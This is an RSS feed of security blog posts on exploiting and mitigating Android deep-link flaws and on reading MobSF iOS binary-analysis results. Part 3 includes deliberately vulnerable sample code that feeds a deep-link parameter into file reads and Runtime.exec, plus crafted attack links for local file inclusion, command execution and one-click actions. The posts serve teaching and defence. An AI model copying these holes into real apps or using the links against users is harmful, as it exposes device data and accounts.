<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Thu, 23 Sep 2021 20:11:06 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Exploiting Deep Links in Android - Part 4 (Mitigation)]]></title><description><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6% of Android devices</a> were still using Android 5 (Lollipop) or earlier versions of</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-4-mitigation/</link><guid isPermaLink="false">614cd409fec7b20db8a36f01</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 23 Sep 2021 20:10:50 GMT</pubDate><content:encoded><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6% of Android devices</a> were still using Android 5 (Lollipop) or earlier versions of the OS, which don&#x2019;t support App Links. So at this point, there are not a lot of excuses to still use Scheme URLs, which are insecure by design.</p><p>As we discussed on <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>, App Links can be tricky to verify correctly. Luckily, there are some tools that can help with this task.</p><p>Google provides a <a href="https://support.google.com/google-ads/answer/10710301?hl=en">Deep Link Validator</a> in their Ads platform:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.28.52.png" class="kg-image" alt loading="lazy" width="1440" height="611" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-23-at-20.28.52.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-23-at-20.28.52.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.28.52.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>The company also provides a <a href="https://developers.google.com/digital-asset-links/tools/generator">Statement List Generator and Tester</a> which enables you to test if the site domain, the app package name and its <code>SHA256</code> fingerprint are correctly verified:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.36.11.png" class="kg-image" alt loading="lazy"></figure><p>During this research I ended up developing a bunch of handy scripts which I refactored into <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester">a tool</a> that, among other things, can help you check if the App Links registered on the application are correctly verified:</p><pre><code>~ python3 Android-Deep-Link-Analyser/deeplink_analyser.py \
-apk com.twitter.android.apk \
-p com.twitter.android \
-op verify-applinks</code></pre><p>The output looks something like:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.40.32.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="validating-untrusted-data">Validating Untrusted Data</h2><p>As a general rule, you should treat all data received via deep link as being potentially malicious. As such, this data should be properly <strong>validated</strong>, <strong>sanitized </strong>and <strong>encoded</strong>.</p><p>If this data is being sent or handled by a <code>WebView</code> then you should follow all of the best practices that are required in a web context.</p><p>Keep in mind that <code>WebViews</code> are typically a lot more dangerous than native UI components such as <code>TextViews</code> - whenever you can go with the latter.</p><p>Finally, when parsing URLs, note that <a href="https://hackerone.com/reports/431002">some URL parsers have known vulnerabilities</a> - you can see an example below:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh5.googleusercontent.com/KTZM2xQgLFfena7OJJakPkLnvyX3lcAdQVdinLeaIxuCVskdMO3g2es-7UT8u6kzU2532AjrJiCFFZtu2aEFl8y7ph7TyprwHTsDgYJJrcO6KN_CborYhhSlOZLTWfVTlwVc5wK7Qyw=s0" class="kg-image" alt loading="lazy"></figure><p>This issue is now fixed for API level 28 - triggering a deep links with a malformed URL loads the attacker&apos;s scripts in Chrome rather than the app&#x2019;s <code>WebView</code> - but this is still valid for older APIs.</p><hr><h2 id="webview-hardening">WebView Hardening</h2><p>As mentioned above, <code>WebViews</code> are a lot more dangerous than traditional UI components: &#xA0;they can potentially lead to <strong>local file exfiltration</strong>; they can allow a malicious user to <strong>access data</strong> created by other applications; and they&apos;re vulnerable to all other known web vulnerabilities.</p><p>When it comes to hardening <code>WebViews</code> the most important thing is to enforce the following settings:</p><ul><li><code>setJavaScriptEnabled(false);</code> -&gt; disables JavaScript;</li><li><code>setAllowFileAccess(false);</code> -&gt; disables file system access;</li><li><code>setAllowContentAccess(false);</code> -&gt; blocks WebViews from loading content from a content provider installed in the system;</li><li><code>setAllowFileAccessFromFileURLs(false);</code> -&gt; deprecated in API 30, this setting prevents malicious scripts loaded in a <code>file://</code> context to access arbitrary local files including WebView cookies and app private data.</li><li><code>setAllowUniversalAccessFromFileURLs(false);</code> -&gt; deprecated in API 30, this setting prevents malicious scripts loaded in a <code>file://</code> context to launch cross-site scripting attacks, either accessing arbitrary local files including <code>WebView</code> cookies, app private data or even credentials used on arbitrary web sites.</li></ul><p>Note that these settings are correctly configured by default on all modern Android APIs, but you should verify if the app developer has not explicitly set them as <code>true</code>.</p><p>Finally, if your app directs users to URLs outside your domain, consider using <a href="https://developer.chrome.com/docs/android/custom-tabs/overview/">Chrome Custom Tabs</a> instead of a <code>WebView</code>:</p><blockquote>CCT opens faster than a browser and, if preloaded via its warm-up call, is potentially even faster than a WebView. While it still runs Javascript, it is in its own process, which prevents apps from running malicious code. Furthermore, the CCT UI provides an action bar which shows the URL of the page being loaded, along with an SSL verification lock icon for secure pages.</blockquote><hr><p>Hopefully, you&apos;re now better equipped to protect your application.<br>On the next post we&apos;ll explore Testing methodologies.</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 3]]></title><description><![CDATA[<p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-3/</link><guid isPermaLink="false">61325b65ca603212098f5e4b</guid><category><![CDATA[android]]></category><category><![CDATA[deep links]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 04 Sep 2021 20:07:17 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" alt="Exploiting Deep Links in Android - Part 3"><p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s continue using the <code>ABC Bank</code> Android application as an example, and imagine that their customer support team uses deep links to help customers see important information displayed inside the app.</p><p>But in this case, instead of a parameter that specifies a web page, the deep link contains the path to a local file, e.g.:</p><pre><code>abcbank://help?file=how-to-enable-mfa.txt</code></pre><p>When the application receives this deep link, it opens the local file, reads its contents and displays in inside a <code>TextView</code>, as shown below:</p><pre><code class="language-Android">String file = getIntent().getData().getQueryParameter(&apos;file&apos;);

AssetManager am = getAssets()
InputStream is = am.open(file);
BufferedReader r = new BufferedReader(new InputStreamReader(is));
StringBuilder str_to_display = &quot;&quot;;

for (String line; (line = r.readline()) != null; ) {
    str_to_display.append(line).append(&apos;\n&apos;);
}

TextView tv = findViewById(R.id.myTextView);
tv.setText(str_to_display.toString());</code></pre><p>So, what&apos;s the danger here? Surely if a user sees their <em>own</em> local data displayed on the screen that&apos;s not much of an issue.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-10.59.34.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy"></figure><p>Well, for starters it depends on whether or not the application enforces any validations when it comes to the files that can be specified via deep link. If there aren&apos;t any validations, then it all comes down to the data can be accessed from the application.</p><p>Note, for example, that if the application includes the <a href="https://developer.android.com/reference/android/Manifest.permission#READ_EXTERNAL_STORAGE">READ_EXTERNAL_STORAGE</a> permission, it can access the user&apos;s pictures - typically stored at <code>/sdcard/DCIM</code> - as well as any other file stored in the SD Card, including those generated by other apps.</p><p>The attack surface can also be expanded if the application has access to <a href="https://developer.android.com/guide/topics/providers/content-providers">Content Providers</a>, which are interfaces that allow multiple apps to share data.</p><p>So, LFIs can be a way to access a lot of sensitive data which, by itself, is not a huge concern. They become really dangerous when an attacker finds a way to exfiltrate the data from the device, which is usually achieved by chaining vulnerabilities.</p><h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2><p>Usually, when we talk about CSRF, we&apos;re exploiting some Cookie (mis)configuration in order to trick a user into performing an unintended action. A typical scenario would be a phishing link that performs a <code>GET</code> request that does some sort of account state change.</p><p>The same scenario is possible in Android if the application registers a deep link that &quot;automatically&quot; performs an action without any additional confirmation from the user.</p><p>A very straightforward example of this was <a href="https://hackerone.com/reports/583987">reported in 2019</a> on the Periscope app: in short, it was possible to trick a user of the Periscope application into following another user of the app, simply by tricking the victim into clicking on a deep link similar to:</p><pre><code>pscp://user/&lt;any-user-id&gt;/follow
</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-11.11.37-1.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy" width="443" height="650"></figure><p>The application, in essence, behaves as the browser by authenticating and sending the request without confirming with the user if they want to perform said action. And the impact is basically whatever feature is supported by the app itself.</p><h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2><p>Achieving RCE is theoretically possible, but very unlikely, since it would require very poor judgement on the part of the application&apos;s developers.</p><p>Let&apos;s go back to the <code>ABC Bank</code> Android app. Their customer support team knows that some OS versions have specific bugs, but their clients are not tech-savvy enough to check the OS by themselves, so they send them a deep link such as this one:</p><pre><code>abcbank://help?cmd=cat%20/system/build.prop</code></pre><p>When the application receives this deep link, it executes the <code>cat /system/build.prop</code> command using <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html">Runtime.getRuntime().exec()</a>, and then the output is displayed on a <code>TextView</code>, just as before:</p><pre><code>String command = getIntent().getData().getQueryParameter(&apos;cmd&apos;);
Process process = Runtime.getRuntime().exec(command)

InputStreamReader isr = InputStreamReader(process.inputStream);
BufferedReader r = new BufferedReader(isr);
StringBuilder str_to_display = &quot;&quot;;

for (String line; (line = r.readline()) != null; ) {
    str_to_display.append(line).append(&apos;\n&apos;);
}

TextView tv = findViewById(R.id.myTextView);
tv.setText(str_to_display.toString());</code></pre><p>The client then simply reads the output to the customer support agent, which can then take that info into account when supporting the user.</p><p>In this scenario and without any additional validations, it would be possible for an attacker to remotely execute commands on the device by simply tricking a victim into clicking a deep link such as:</p><pre><code>deeplink://path?cmd=&lt;the-evil-command&gt;</code></pre><p>But, again, it would be a sign of very poor judgement to allow a user to specify commands directly via deep link, particularly without any additional validations, and proof of that is the fact that I couldn&apos;t find any actual examples of RCE reported in the wild.</p><hr><p>And that&apos;s it for now! On the next part I&apos;ll explore Mitigation.</p>]]></content:encoded></item><item><title><![CDATA[MobSF "IPA Binary Analysis" | Step by Step]]></title><description><![CDATA[<p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this</p>]]></description><link>inesmartins.github.io/mobsf-ipa-binary-analysis-step-by-step/</link><guid isPermaLink="false">6116ea0cfd1c6c08ebabac74</guid><category><![CDATA[ipa]]></category><category><![CDATA[mobsf]]></category><category><![CDATA[binary analysis]]></category><category><![CDATA[rev]]></category><category><![CDATA[apple]]></category><category><![CDATA[binary exploitation]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 21 Aug 2021 21:57:25 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step"><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this article will help you understand why each vulnerability was reported and how to fix it.</p><hr><h2 id="getting-to-the-good-stuff">Getting to the good stuff</h2><p><code>.ipa</code> files are actually just zipped files that include the application executable and a bunch of other stuff.</p><p>When we talk about binary analysis, we&apos;re actually just talking about analysing this executable file, so the first thing we need to do is <strong>find it</strong>.</p><p>Note that if you don&apos;t have access to the <code>.ipa</code> you can extract it from the App Store using <a href="https://github.com/majd/ipatool">ipatool</a>:</p><pre><code>~ brew tap majd/repo
~ brew install ipatool
~ ipatool download --bundle-identifier &lt;app-bundle-id&gt; --email &lt;appstore-account-email&gt; --password &lt;appstore-account-password&gt;
</code></pre><p>So, now that you have your <code>.ipa</code> it&apos;s time to unzip it and look inside:</p><pre><code>~ unzip MyApp.ipa
~ cd Payload/
~ cd MyApp.app/
~ file MyApp
MyApp: Mach-O 64-bit executable arm64</code></pre><p>As you can see above, the app binary is compiled for <code>ARM</code> and uses the <code>Mach-O</code> file format.</p><p>A more thorough analysis of this binary can be done using <a href="https://www.manpagez.com/man/1/otool/">otool</a>. You should become familiar with this tool since it will help us validate and fix most of the issues reported below.</p><p>Alternatively, I also recommend <a href="https://h3adsh0tzz.com/projects/htool/">htool</a>, which serves the similar purpose of analysing <code>Mach-O</code> binaries.</p><hr><h2 id="arc">ARC</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1125" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.27.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1125w"></figure><p>If you&apos;re used to working with Swift, then you most likely know <code>ARC</code> or &quot;Automatic Reference Counting&quot; simply as <a href="https://docs.swift.org/swift-book/LanguageGuide/AutomaticReferenceCounting.html">one of the core features</a> of the language. </p><p>However, <code>ARC</code> is actually a feature of the Clang compiler, and unlike with Swift, you can<em> </em>(but <a href="https://stackoverflow.com/questions/8760431/to-arc-or-not-to-arc-what-are-the-pros-and-cons/8760820#8760820">shouldn&apos;t</a>) use Objective-C without using Automatic Reference Counting.</p><p>If you&apos;ve never heard of &quot;Automatic Reference Counting&quot; you should basically know that it &quot;automatically frees up the memory used by class instances when those instances are no longer needed&quot;. </p><p>The alternative is to leave memory management to the developer, who is always less reliable and can easily make mistakes that can lead to memory corruption vulnerabilities.</p><p>So, if your application is written (at least partially) in Objective-C, you should first make sure that the project is configured to use <code>ARC</code> by checking the <code>&quot;Objective-C Automatic Reference Counting&quot;</code> setting under the <code>&quot;Build Settings&quot;</code> tab:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-6.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1086" height="432" srcset="inesmartins.github.io/content/images/size/w600/2021/08/image-6.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/image-6.png 1000w, inesmartins.github.io/content/images/2021/08/image-6.png 1086w"><figcaption>https://advancetechtutorial.blogspot.com/2016/07/xcode-arc-automatic-reference-counting.html</figcaption></figure><p>If this property is set to <code>No</code>, you should &quot;Convert&quot; the project, as shown below:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-5.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="561" height="421"><figcaption>https://stackoverflow.com/questions/8969644/tool-for-transitioning-to-arc/8969662</figcaption></figure><p>You can also check the <code>&quot;Compile Sources&quot;</code> section under the <code>&quot;Build Phases&quot;</code> tab for the presence of the <code>-fno-objc-arc</code> flag, which is used to exclude specific files from using <code>ARC</code>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1024" height="434" srcset="inesmartins.github.io/content/images/size/w600/2021/08/flag-1024x434.jpeg 600w, inesmartins.github.io/content/images/size/w1000/2021/08/flag-1024x434.jpeg 1000w, inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg 1024w"><figcaption>https://thomashanning.com/how-to-disable-arc-for-objective-c-files/</figcaption></figure><p>Since there are limitations that come with using <code>ARC</code>, the adequacy of these exceptions should be evaluated on a case by case basis.</p><p>As mentioned above, <code>otool</code> can help us understand our binary files a little better.</p><p>When it comes to <code>ARC</code> we can use this tool to check for the presence of ARC-related symbols, such as <code>_objc_release</code>, <code>_objc_autorelease</code>, <code>_objc_storeStrong</code>, <code>_objc_retain</code>, etc.:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.52.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
	...
	-I print the indirect symbol table
	-v print verbosely (symbolically) when possible</code></pre><h2 id="code-signature">Code Signature</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1123" height="54" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.35.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1123w"></figure><p>From the <a href="https://developer.apple.com/support/code-signing/">Apple docs on Code Signing</a> we can read:</p><blockquote>Before your app can integrate app services, be installed on a device, or be submitted to the App Store, it must be signed with a <a href="https://developer.apple.com/support/certificates/">certificate</a> issued by Apple.</blockquote><p>Also, from the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>:</p><blockquote>In order to develop and install apps on iOS devices, developers must register with Apple and join the iOS Developer Program. The real-world identity of each developer, whether an individual or a business, is verified by Apple before their certificate is issued. <br>[...]<br>At runtime, code signature checks of all executable memory pages are made as they are loaded to ensure that an app has not been modified since it was installed or last updated.</blockquote><p>So, code signing is simply the process of signing an application with an appropriate certificate that ensures the author&apos;s identity and the app content&apos;s integrity.</p><p>Since this process is required by Apple for most operations, if this section is flagged as &quot;False&quot; by MobSF, it&apos;s likely that the file you&apos;re analysing was generated via some non-traditional method, which seems worth investigating.</p><h2 id="encrypted">Encrypted</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="55" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.17.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png 932w"></figure><p>Similarly to the previous section, encryption shouldn&apos;t be a concern for most iOS developers, since the <code>App Store</code> takes care of it during the distribution process.</p><p>From <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev&apos;s Wiki</a>:</p><blockquote>App Store binaries are signed by both their developer and Apple. This encrypts the binary so that decryption keys are needed in order to make the binary readable.</blockquote><p>So, when it comes to the MobSF analysis you should keep in mind the origin of the <code>.ipa</code> you&apos;re testing:</p><ul><li>if you simply download it from the <code>App Store</code> (using <code>ipatool</code>, for example), then the binary should be encrypted;</li><li>if you get the <code>.ipa</code> from any other source, then most likely it&apos;s not encrypted.</li></ul><p>To confirm the binary&apos;s encryption you can use <code>otool</code> to look for the <code>LC_ENCRYPTION_INFO</code> section:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.32.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="462" height="120"></figure><p>From the <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev Wiki</a>:</p><blockquote>iOS can tell the encryption status of a binary via the <code>cryptid</code> struture member of <code>LC_ENCRYPTION_INFO</code> <code>MachO</code> <code>load</code> command. <br>If <code>cryptid</code> is a non-zero value then the binary in encrypted.</blockquote><p>Note that the <code>cryptsize</code> indicates the size of the encrypted segment.</p><p>Also note the usage of <code>otool</code>&apos;s <code>-l</code> flag:</p><pre><code>~ otool
	...
	-l print the load commands</code></pre><h2 id="nx">NX</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="930" height="76" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.38.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png 930w"></figure><p>Although the <code>NX bit</code> is specific to the <code>AMD</code> architecture, people tend to use &quot;NX&quot; as a generic way of referring to the feature that enables you to <strong>specify non-executable memory pages</strong>. </p><p>So, in this case, the <code>NX</code> section actually refers to the <code>XN</code> or &quot;eXecute never&quot; feature, since we&apos;re dealing with an <code>ARM</code> binary.</p><p>In the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>, under &quot;Runtime process security&quot; we can read:</p><blockquote>Further protection is provided by iOS using ARM&#x2019;s Execute Never (XN) feature, which marks memory pages as non-executable. <br>Memory pages marked as both writable and executable can be used only by apps under tightly controlled conditions: <br>The kernel checks for the presence of the Apple-only dynamic code-signing entitlement. Even then, only a single mmap call can be made to request an executable and writable page, which is given a randomized address. </blockquote><p>So, this section should never be flagged by MobSF, as long as Apple continues to use <code>XN</code> by default.</p><h2 id="pie">PIE</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.40.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png 932w"></figure><p>As explained above, each time you run a &quot;Position Independent Executable&quot; (<code>PIE</code>), the binary and all of its dependencies are loaded into random locations within virtual memory, which make ROP attacks much more difficult to execute reliably.</p><p>We can check for the presence of the <code>PIE</code> flag in our executable with <code>otool</code>: </p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1151" height="96" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1151w"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-h</code> and <code>-v</code> options:</p><pre><code>~ otool
	...
	-h print the mach header
	-v print verbosely (symbolically) when possible</code></pre><p>If this flag is not present in the binary, then you need to review your compilation settings.</p><p>First, ensure that <code>&quot;Don&apos;t Create Position Independent Executables&quot;</code> &#xA0;under <code>&quot;Build Settings&quot;</code> is set to <code>NO</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/rHGq2.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"><figcaption>https://stackoverflow.com/questions/32728783/why-would-xcode-not-use-the-build-configuration-settings-from-my-xcconfig-file</figcaption></figure><p>Then, check that these flags are set:</p><ul><li>In <code>Other C flags</code>: <code>-fPIC</code></li><li>In <code>Other Warning flags</code>: <code>-Wl,--emit-relocs</code> (retains all relocations in the executable file) and <code>-Wl,--warn-shared-textrel</code> (warns if the text segment is not shareable).</li></ul><h2 id="stack-canary">Stack Canary</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="124" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.19.33.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png 932w"></figure><p>Again we can use <code>otool</code> to check whether a binary is using stack canaries by looking for some specific symbols, such as <code>_stack_chk_guard</code> and <code>_stack_chk_fail</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.44.30.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="434" height="150"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
	...
	-I print the indirect symbol table
	-v print verbosely (symbolically) when possible</code></pre><p>If the stack canary is not present, you need to ensure that the <code>-fstack-protector-all</code> flag is set under <code>&quot;Other C Flags&quot;</code>, on your project&apos;s <code>&quot;Build Settings&quot;</code> tab, as shown below:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="881" height="165" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-22.50.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-22.50.58.png 881w" sizes="(min-width: 720px) 720px"></figure><h2 id="rpath">Rpath</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="933" height="103" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.58.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.58.png 933w"></figure><p>The &quot;Runpath Search Path&quot; instructs the dynamic linker to search for a dynamic library (dylib) on an ordered list of paths ... sort of like how Unix looks for binaries on <code>$PATH</code>.</p><p>This is an issue because it makes it possible for an attacker to place a malicious dylib in one of the first paths that doesn&apos;t contain the library that the linker is trying to locate, therefore hijacking it.</p><p>A simple way to check whether or not your application&apos;s libraries were compiled using <code>rpath</code> is to run <code>otool</code> with the <code>-L</code> flag, which lists all Mach-O Shared Libraries:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1324" height="245" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-21.28.28-1.png 1324w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that some of the libraries are prefixed with <code>@rpath</code>, while others are prefixed by the absolute path.</p><p>Also, if you already have access to the full MobSF Static Analysis report, you can simply scroll down to the &quot;Libraries&quot; section and check which are prefixed by <code>@rpath</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img 